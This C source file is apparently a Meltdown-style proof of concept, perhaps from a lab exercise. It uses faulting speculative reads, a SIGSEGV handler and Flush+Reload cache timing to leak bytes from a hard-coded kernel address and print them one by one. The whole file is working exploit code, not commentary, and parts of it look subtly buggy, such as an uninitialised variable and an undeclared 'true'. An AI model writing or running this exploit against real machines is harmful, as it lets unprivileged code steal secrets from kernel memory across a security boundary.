#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <string.h>
#include <stdarg.h>
#include <inttypes.h>
#include <time.h>
//SECRET: This is the secret: Happy Hacking!
#define MEMORY_PAGE_SIZE 4096

#define KERNEL_BASE_ADDRESS 0xffff88c300000000

uint64_t offset = 0x5fa8688a0; 

uint8_t *userArray; 
static size_t reload_threshold; 
uint8_t *target = (uint8_t*) (0xffff88c300000000 + 0x5fa8688a0);
jmp_buf buf;
FILE* output;


void clflush(volatile void* Tx) {
    asm volatile("lfence;clflush (%0) \n" :: "c" (Tx));
}


static __inline__ uint64_t timer_start (void) {
        unsigned cycles_low, cycles_high;
        asm volatile ("CPUID\n\t"
                    "RDTSC\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
                    "%rax", "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ uint64_t timer_stop (void) {
        unsigned cycles_low, cycles_high;
        asm volatile("RDTSCP\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t"
                    "CPUID\n\t": "=r" (cycles_high), "=r" (cycles_low):: "%rax",
                    "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}




static __inline__ void maccessFaulty(void *p)
{
    asm volatile(
        "1:\n"
        "movzx (%%rcx), %%rax\n"
        "shl $12, %%rax\n"
        "jz 1b\n"
        "movq (%%rbx,%%rax,1), %%rbx\n"
        :: "c"((void*) target), "b"(userArray)
        : "rax"
    );
}

static __inline__ void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

uint32_t reloadFaulty(void *p)
{
    uint64_t t1, t2;
    t1 = timer_start();
    maccessFaulty(p);
    t2 = timer_stop();
    return t2 - t1;
}

uint32_t reload(void *p)
{
    uint64_t t1, t2;
    t1 = timer_start();
    maccess(p);
    t2 = timer_stop();
    return t2 - t1;
}

static void unblock_signal(int signum __attribute__ ((__unused__)))
{
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum)
{
    (void) signum;
    unblock_signal(SIGSEGV);
    // printf("Unblocked signal!");
    longjmp(buf, 1);    
}

void findThreshold()
{
    size_t reloadTime = 0, flushReloadTime = 0, i, numTests=100000;
    void* addr = malloc(10);
    size_t *ptr = (size_t*) addr;
    maccess(addr);
    for (i = 0; i < numTests; i++)
    {
        reloadTime += reload((void*) ptr);
    }

    for (i = 0; i < numTests; i++) 
    {
        flushReloadTime += reload((void*) ptr);
        clflush(addr);
    }

    reloadTime /= numTests;
    flushReloadTime /= numTests;
    reload_threshold = (reloadTime*.8) + (flushReloadTime*.2);
    printf("Reload time is %zu\t Flush+Reload time is %zu\n", reloadTime, flushReloadTime);
    printf("Threshold is %zu\n", reload_threshold);

}
void getData()
{   
    size_t mallocSize = MEMORY_PAGE_SIZE * sizeof(uint8_t) * 256;
    userArray = (uint8_t*) malloc(mallocSize);
    memset(userArray, 0, mallocSize);
    // volatile uint8_t data = 10;
    uint32_t timing = 0;

    uint8_t sniffedData;
    while(true)
    {
        while (!sniffedData)
        {
            for (int k = 0; k < 256; k++)
            {
                clflush((void*) (userArray + (k * MEMORY_PAGE_SIZE)));
            }

            if (!setjmp(buf))
            {
                maccessFaulty((void*) userArray);
            }
            for (int k = 0; k < 256; k++) 
            {  
                timing = reload((void*) (userArray + (k * MEMORY_PAGE_SIZE)));
                if (timing < reload_threshold)
                {
                    sniffedData = k;
                    break;
                }
            }
        }
        printf("%c", sniffedData);
        fflush(stdout);

        sniffedData = 0;
        timing = 0;
        target = (uint8_t*) (target + 1);
    }
}

int main()
{
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR)
    {
        printf("Unable to setup signal handler\n");
        return -1;
    }
    
    findThreshold();
    getData();


}
